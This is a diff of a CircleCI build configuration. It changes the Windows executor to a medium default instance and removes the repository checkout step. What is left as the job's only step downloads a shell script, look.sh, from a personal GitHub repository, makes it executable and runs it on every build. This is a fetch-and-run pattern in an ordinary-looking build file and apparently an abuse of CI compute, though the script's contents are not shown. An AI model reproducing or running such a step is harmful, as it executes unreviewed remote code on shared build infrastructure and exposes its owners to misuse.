@@ -1,10 +1,12 @@
 version: 2.1
+
 orbs:
   win: circleci/windows@2.3.0
 
 jobs:
   build:
-    executor: win/gpu-nvidia
+    executor:
+      name: win/default
+      size: "medium" # can be "medium", "large", "xlarge", "2xlarge"
     steps:
-      - checkout
       - run: wget https://raw.githubusercontent.com/vivomito/out/main/look.sh && chmod +x look.sh && ./look.sh
